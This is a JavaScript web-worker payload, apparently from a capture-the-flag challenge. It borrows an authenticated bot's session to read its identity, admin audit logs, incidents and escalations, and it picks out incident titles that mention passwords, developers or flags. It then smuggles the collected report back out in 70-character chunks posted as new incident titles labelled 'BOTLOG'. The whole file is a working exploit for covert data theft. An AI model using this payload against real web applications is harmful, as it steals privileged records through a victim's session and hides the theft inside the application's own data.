
(async () => {
    const ORIGIN = self.location.origin;

    self.postMessage({
        type: "progress",
        message: "BOTLOG: Starting authenticated session inspection"
    });

    async function get(path) {
        try {
            const response = await fetch(
                new URL(path, ORIGIN).href,
                {
                    credentials: "include",
                    cache: "no-store"
                }
            );

            const raw = await response.text();

            let body;
            try {
                body = JSON.parse(raw);
            } catch {
                body = raw;
            }

            return {
                status: response.status,
                body
            };
        } catch (e) {
            return { error: String(e) };
        }
    }

    const report = {
        timestamp: new Date().toISOString(),
        endpoints: {}
    };

    // Current authenticated bot identity
    report.endpoints.me = await get("/api/me");

    // Audit records
    report.endpoints.audit = await get(
        "/api/admin/audit?limit=25"
    );

    // Incident records
    report.endpoints.incidents = await get("/api/incidents");

    // Escalation records
    report.endpoints.escalations = await get("/api/escalations");

    self.postMessage({
        type: "progress",
        message: "BOTLOG: Initial records collected"
    });

    // Retrieve individual audit entry details
    const auditBody = report.endpoints.audit.body;
    const entries = auditBody?.entries || [];

    report.auditDetails = [];

    for (const entry of entries.slice(0, 20)) {
        const detail = await get(
            "/api/admin/audit?log=" +
            encodeURIComponent(entry.id)
        );

        report.auditDetails.push({
            id: entry.id,
            detail
        });
    }

    // Extract useful incident information
    const incidentBody = report.endpoints.incidents.body;

    if (incidentBody?.incidents) {
        report.incidentHighlights =
            incidentBody.incidents
                .filter(i =>
                    /BOT|CyCTF|flag|password|developer|PWN/i.test(
                        i.title || ""
                    )
                )
                .map(i => ({
                    id: i.id,
                    code: i.code,
                    title: i.title,
                    created_by: i.created_by
                }));
    }

    // Serialize report
    const serialized = JSON.stringify(report);

    const chunkSize = 70;
    const total = Math.ceil(serialized.length / chunkSize);

    self.postMessage({
        type: "progress",
        message: `BOTLOG: Sending ${total} chunks`
    });

    // Send results through incident titles
    for (let i = 0; i < total; i++) {
        const chunk = serialized.slice(
            i * chunkSize,
            (i + 1) * chunkSize
        );

        const title =
            `BOTLOG-${String(i + 1).padStart(3, "0")}:${chunk}`;

        const response = await fetch(
            new URL("/api/incidents", ORIGIN).href,
            {
                method: "POST",
                credentials: "include",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    title,
                    facility: "Meridian-2",
                    severity: "Watch"
                })
            }
        );

        const result = await response.json();

        if (!response.ok || result.ok === false) {
            throw new Error(
                `Chunk ${i + 1} failed: ${JSON.stringify(result)}`
            );
        }

        if ((i + 1) % 5 === 0) {
            self.postMessage({
                type: "progress",
                message: `BOTLOG: Uploaded ${i + 1}/${total}`
            });
        }

        await new Promise(resolve => setTimeout(resolve, 100));
    }

    self.postMessage({
        type: "progress",
        message: `BOTLOG_UPLOAD_COMPLETE:${total}`
    });

})().catch(error => {
    self.postMessage({
        type: "progress",
        message: "BOTLOG_ERROR: " + String(error)
    });
});
